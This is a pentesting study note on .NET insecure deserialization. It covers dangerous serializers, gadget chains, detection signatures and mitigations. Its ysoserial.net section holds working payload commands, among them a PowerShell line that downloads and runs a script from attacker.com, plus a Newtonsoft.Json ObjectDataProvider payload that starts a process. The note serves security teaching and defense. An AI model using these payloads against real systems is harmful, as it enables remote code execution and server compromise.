# 11 - .NET Deserialization using ysoserial.net

## 1. Introduction to .NET Deserialization

Insecure deserialization in .NET represents one of the most critical vulnerability classes in enterprise web applications. Deserialization is the process of taking structured data (like binary streams, XML, or JSON) and converting it back into living objects in memory. In .NET, serialization is deeply embedded into the framework, used for everything from ViewState in ASP.NET to Remoting, WCF (Windows Communication Foundation), and caching mechanisms.

When a .NET application deserializes untrusted data without proper validation, an attacker can manipulate the serialized stream to force the application to instantiate arbitrary classes. If the attacker can control the properties of these instantiated classes, they can often trigger malicious side effects, most notably Remote Code Execution (RCE).

The .NET framework contains numerous "gadgets"—classes that perform potentially dangerous operations during their instantiation or garbage collection. The `ysoserial.net` tool is the industry standard for generating malicious serialized payloads using known gadget chains.

## 2. Deep Dive into .NET Serializers

.NET provides a wide array of serialization mechanisms, and their susceptibility to attack varies heavily depending on whether they allow "type resolution" from the serialized stream itself.

### Dangerous Serializers
The following serializers are inherently dangerous when used with untrusted data because they embed type information directly in the stream:
- **BinaryFormatter**: The most notorious. Used in .NET Remoting, ViewState (via ObjectStateFormatter), and older caching mechanisms.
- **NetDataContractSerializer**: Unlike DataContractSerializer, this includes .NET type information, making it dangerous.
- **LosFormatter**: Designed for Web Forms ViewState.
- **ObjectStateFormatter**: The modern replacement for LosFormatter in ViewState.
- **SoapFormatter**: Similar to BinaryFormatter but outputs SOAP XML.

### Conditionally Dangerous Serializers
These serializers are safe by default but can be made vulnerable through configuration:
- **Newtonsoft.Json (Json.NET)**: Vulnerable if `TypeNameHandling` is set to anything other than `None` (e.g., `Auto`, `All`, `Objects`).
- **XmlSerializer**: Generally safe, but can be exploited if used in conjunction with vulnerable types or expanded entity injection (XXE).

## 4. Gadget Chains Explained

A gadget is an existing class within the target application's execution environment that has a side effect when deserialized. By linking multiple gadgets together (a "gadget chain"), an attacker can bridge the gap between object instantiation and code execution.

### The TypeConfuseDelegate Gadget
This is one of the most reliable and widely used gadget chains in .NET. It leverages the `System.Delegate` and `MulticastDelegate` classes.
1. The attacker creates a serialized representation of a generic `SortedSet<T>`.
2. The `SortedSet<T>` relies on an `IComparer<T>` to sort its elements.
3. The attacker provides a malicious delegate that poses as an `IComparer<T>`.
4. When the `SortedSet<T>` is deserialized, it attempts to sort its elements, invoking the attacker-controlled delegate.
5. Due to a type confusion vulnerability in how delegates are serialized, the runtime executes the delegate, which is mapped to `Process.Start`, resulting in RCE.

### Other Notable Gadgets
- **TextFormattingRunProperties**: Uses WPF (Windows Presentation Foundation) classes to execute XAML payloads.
- **WindowsIdentity**: Triggers execution through the `ISerializable` implementation and finalizers.
- **ObjectDataProvider**: Frequently used in XML/JSON payloads to invoke arbitrary methods.

## 5. Using ysoserial.net for Exploitation

`ysoserial.net` is a command-line tool that generates payloads for various formatters and gadget chains.

### Basic Generation
To generate a payload using `BinaryFormatter` and `TypeConfuseDelegate` to execute a command:
```powershell
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.com" -o base64
```
This generates a Base64-encoded string representing the serialized malicious objects.

### Exploiting ASP.NET ViewState
If an ASP.NET application has `EnableViewStateMac="false"` (a massive security misconfiguration), or if you have obtained the `MachineKey` (e.g., via LFI/Path Traversal reading `web.config`), you can forge a ViewState.

```powershell
# Generating a ViewState payload without MAC
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')" -o base64

# Generating a ViewState payload WITH MAC (Requires MachineKey)
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping attacker.com" --generator 01234567 --validationalg SHA1 --validationkey <KEY>
```

### Exploiting Newtonsoft.Json
If an API endpoint accepts JSON and uses `TypeNameHandling.Auto`, it might be vulnerable. The payload requires a specific structure utilizing `ObjectDataProvider`.

```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd", "/c calc.exe"]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
}
```

## 6. Identifying Insecure Deserialization in Black-box Testing

Identifying .NET deserialization vulnerabilities from an external perspective relies heavily on identifying serialization signatures and observing application behavior.

### Recognizing Signatures
- **Base64 encoded BinaryFormatter**: Often begins with `AAEAAAD/////`. This translates to the hex sequence `00 01 00 00 00 FF FF FF FF`.
- **LosFormatter**: Often begins with `/w` (e.g., `/wEP...`).
- **SoapFormatter**: Look for XML containing `<SOAP-ENV:Envelope>` and elements like `a1:TypeConfuseDelegate` or extensive type declarations in namespaces.
- **JSON Type Info**: Look for JSON properties named `$type`.

### Behavioral Testing
- Send a modified but valid payload and observe the response. If the application throws an exception related to cast errors or deserialization failures, it might be vulnerable.
- Send a "sleep" payload (e.g., `ping -n 10 127.0.0.1`) and measure the response time to confirm execution without needing an out-of-band channel.

## 7. Mitigation and Remediation Strategies

Fixing deserialization vulnerabilities requires systemic changes to how data is handled.

### Do Not Use Insecure Serializers
The primary remediation is to completely avoid using `BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter`, `SoapFormatter`, and `NetDataContractSerializer` for processing untrusted data. Microsoft has officially deprecated `BinaryFormatter` due to its inherent security risks.

### Use Safe Alternatives
Migrate to serializers that do not support arbitrary type resolution out-of-the-box:
- `System.Text.Json`
- `DataContractSerializer`
- `XmlSerializer` (with proper mitigations against XXE)

### Implementing a SerializationBinder
If you are forced to use a polymorphic serializer like Newtonsoft.Json with `TypeNameHandling`, you MUST implement an `ISerializationBinder` to restrict the types that can be instantiated to a strict allow-list.

```csharp
public class SafeSerializationBinder : DefaultSerializationBinder
{
    public override Type BindToType(string assemblyName, string typeName)
    {
        // STRICT ALLOW-LIST
        if (typeName == "MyApplication.Models.SafeUser" && assemblyName.StartsWith("MyApplication"))
        {
            return typeof(MyApplication.Models.SafeUser);
        }
        
        throw new SecurityException("Attempt to deserialize unauthorized type: " + typeName);
    }
}

// Usage:
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.Auto,
    SerializationBinder = new SafeSerializationBinder()
};
var obj = JsonConvert.DeserializeObject<SafeUser>(jsonInput, settings);
```

### Protect ViewState
Ensure that `EnableViewStateMac` is always set to `true` (it is by default in modern ASP.NET).
Ensure that `web.config` does not hardcode `MachineKey` values, and protect the server from Local File Inclusion vulnerabilities that could expose the key.

## 8. Chaining Opportunities

- **[[15 - Server-Side Template Injection SSTI in Enterprise Apps]]**: Finding an LFI via SSTI can lead to reading the `web.config`, obtaining the `MachineKey`, and exploiting ViewState deserialization.
- **[[04 - SSRF Server-Side Request Forgery]]**: Deserialization payloads can be crafted to initiate HTTP requests to internal networks, chaining into SSRF even if full RCE is restricted by outbound firewall rules.
- **[[08 - Privilege Escalation via Deserialization]]**: If the vulnerable application pool runs as a high-privileged account (e.g., `LocalSystem`), exploiting deserialization immediately results in full system takeover.
